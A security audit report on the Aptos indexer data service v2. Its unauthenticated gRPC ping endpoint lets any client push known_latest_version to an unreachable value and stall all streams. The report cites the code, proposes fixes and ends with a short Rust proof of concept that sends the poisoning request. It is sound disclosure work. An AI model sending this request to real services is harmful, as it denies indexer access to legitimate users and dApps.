# Audit Report

## Title
Unauthenticated Access Control Vulnerability in Indexer Data Service Ping Endpoint Allows Denial of Service via Chain State Manipulation

## Summary
The `ping` endpoint in the indexer-grpc-data-service-v2 lacks any authentication or authorization checks, allowing any client to arbitrarily update the service's `known_latest_version` state variable. An attacker can exploit this to set an artificially high version number, causing the service to enter an indefinite wait state and denying service to all legitimate clients.

## Finding Description
The `DataServiceWrapper::ping` method accepts `PingDataServiceRequest` messages from any gRPC client without authentication. [1](#0-0) 

The method extracts the `known_latest_version` from the request and directly updates the `ConnectionManager`'s internal state using `fetch_max`, which only allows the version to increase, never decrease. [2](#0-1) 

This `known_latest_version` is used throughout the `LiveDataService` to:
1. Set the default `starting_version` for new client streams when none is specified [3](#0-2) 
2. Validate that requested starting versions are not more than 10,000 versions ahead [4](#0-3) 
3. Control the streaming loop's wait behavior when the next version exceeds the known latest [5](#0-4) 

**Attack Scenario:**
1. Attacker sends a gRPC `Ping` request with `known_latest_version` set to `u64::MAX - 10000`
2. The service updates its internal state to this artificially high value
3. New clients that don't specify a `starting_version` default to this unreachable version
4. The streaming loop waits indefinitely at line 178-182 since `next_version > known_latest_version` will never be satisfied as the real chain will never reach this version
5. All legitimate clients hang, resulting in complete service unavailability
6. The issue persists until service restart, but can be immediately re-exploited

The configuration shows the service can be deployed with or without TLS and can expose ports publicly. [6](#0-5) 

No authentication mechanism exists in the v2 service implementation, unlike potential patterns in other indexer services.

## Impact Explanation
This qualifies as **High Severity** under the Aptos bug bounty criteria for "API crashes" and "Significant protocol violations":

- **Complete Service Disruption**: The indexer data service becomes unusable for all clients, preventing dApps from accessing blockchain data
- **Persistent State Corruption**: The `fetch_max` operation means the corrupted state cannot be corrected without restarting the service
- **Ecosystem-Wide Impact**: Indexers are critical infrastructure - their unavailability affects all dApps and services depending on historical blockchain data access
- **No Recovery Path**: Even after restart, the attack can be immediately repeated

While this does not affect consensus or validator operations, it targets essential data infrastructure that the Aptos ecosystem relies on for data access and queries.

## Likelihood Explanation
**Likelihood: HIGH**

- **No Authentication Required**: Any gRPC client can call the endpoint
- **Trivial to Exploit**: Single gRPC call with one manipulated field
- **Public Exposure**: Service can be deployed with public endpoints for data access
- **No Rate Limiting**: No apparent protections against repeated exploitation
- **Low Detection Risk**: The attack looks like legitimate health check traffic
- **Immediate Impact**: Effect is instantaneous upon successful exploitation

The legitimate use case involves the grpc-manager pinging data services with version updates. [7](#0-6)  However, the endpoint has no mechanism to distinguish between legitimate manager requests and malicious client requests.

## Recommendation
Implement authentication and authorization for the `ping` endpoint using one of these approaches:

**Option 1: Service-to-Service Authentication**
- Add mutual TLS authentication to verify the caller is an authorized grpc-manager instance
- Reject ping requests from unauthorized sources

**Option 2: Version Validation**
- Validate that the provided `known_latest_version` is within a reasonable range of the current chain state
- Add a maximum allowed jump (e.g., reject versions more than 100,000 ahead of current known version)
- Cross-check with actual fullnode data before accepting updates

**Option 3: Token-Based Authentication**
- Implement token-based authentication similar to the v1 data service pattern
- Require authentication tokens for ping endpoint access
- Whitelist only grpc-manager instances

**Recommended Fix (Option 2 - Validation):**
```rust
async fn ping(
    &self,
    req: Request<PingDataServiceRequest>,
) -> Result<Response<PingDataServiceResponse>, Status> {
    let request = req.into_inner();
    if request.ping_live_data_service != self.is_live_data_service {
        if request.ping_live_data_service {
            return Err(Status::not_found("LiveDataService is not enabled."));
        } else {
            return Err(Status::not_found("HistoricalDataService is not enabled."));
        }
    }

    let known_latest_version = request.known_latest_version();
    let current_known_version = self.connection_manager.known_latest_version();
    
    // Validate that the new version is not unreasonably far ahead
    const MAX_VERSION_JUMP: u64 = 100_000;
    if known_latest_version > current_known_version + MAX_VERSION_JUMP {
        return Err(Status::invalid_argument(
            format!("known_latest_version {} is too far ahead of current version {}", 
                    known_latest_version, current_known_version)
        ));
    }
    
    self.connection_manager
        .update_known_latest_version(known_latest_version);
    // ... rest of implementation
}
```

## Proof of Concept
```rust
// PoC demonstrating the vulnerability
use tonic::Request;
use aptos_protos::indexer::v1::{
    data_service_client::DataServiceClient,
    PingDataServiceRequest,
};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to the data service (replace with actual address)
    let mut client = DataServiceClient::connect("http://[data-service-address]:50052").await?;
    
    // Create malicious ping request with extremely high version
    let malicious_request = PingDataServiceRequest {
        known_latest_version: Some(u64::MAX - 10000),
        ping_live_data_service: true,
    };
    
    // Send the malicious ping - no authentication required
    let response = client.ping(Request::new(malicious_request)).await?;
    
    println!("Successfully poisoned service state: {:?}", response);
    
    // Now all legitimate clients that don't specify starting_version 
    // will default to u64::MAX - 10000 and hang indefinitely
    
    Ok(())
}
```

**Notes**

This vulnerability exists specifically in the v2 implementation of the indexer data service. The service architecture relies on the `ping` endpoint for health monitoring and version synchronization between the grpc-manager and data services, but fails to implement any access control mechanism to distinguish authorized manager instances from arbitrary clients. The use of `fetch_max` for version updates prevents downward corrections, making the corrupted state persistent until service restart. The indexer infrastructure, while not part of the consensus layer, is critical for ecosystem functionality as dApps and users depend on it for accessing historical blockchain data.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/service.rs (L151-166)
```rust
    async fn ping(
        &self,
        req: Request<PingDataServiceRequest>,
    ) -> Result<Response<PingDataServiceResponse>, Status> {
        let request = req.into_inner();
        if request.ping_live_data_service != self.is_live_data_service {
            if request.ping_live_data_service {
                return Err(Status::not_found("LiveDataService is not enabled."));
            } else {
                return Err(Status::not_found("HistoricalDataService is not enabled."));
            }
        }

        let known_latest_version = request.known_latest_version();
        self.connection_manager
            .update_known_latest_version(known_latest_version);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/connection_manager.rs (L185-188)
```rust
    pub(crate) fn update_known_latest_version(&self, version: u64) {
        self.known_latest_version
            .fetch_max(version, Ordering::SeqCst);
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/mod.rs (L82-83)
```rust
                let known_latest_version = self.get_known_latest_version();
                let starting_version = request.starting_version.unwrap_or(known_latest_version);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/mod.rs (L86-96)
```rust
                if starting_version > known_latest_version + 10000 {
                    let err = Err(Status::failed_precondition(
                        "starting_version cannot be set to a far future version.",
                    ));
                    info!("Client error: {err:?}.");
                    let _ = response_sender.blocking_send(err);
                    COUNTER
                        .with_label_values(&["live_data_service_requested_data_too_new"])
                        .inc();
                    continue;
                }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/mod.rs (L178-183)
```rust
            let known_latest_version = self.get_known_latest_version();
            if next_version > known_latest_version {
                info!(stream_id = id, "next_version {next_version} is larger than known_latest_version {known_latest_version}");
                tokio::time::sleep(Duration::from_millis(100)).await;
                continue;
            }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L50-54)
```rust
pub struct ServiceConfig {
    /// The address to listen on.
    pub(crate) listen_address: SocketAddr,
    pub(crate) tls_config: Option<TlsConfig>,
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L445-453)
```rust
    async fn ping_live_data_service(
        &self,
        address: GrpcAddress,
        mut client: DataServiceClient<Channel>,
    ) -> Result<()> {
        let request = PingDataServiceRequest {
            known_latest_version: Some(self.get_known_latest_version()),
            ping_live_data_service: true,
        };
```
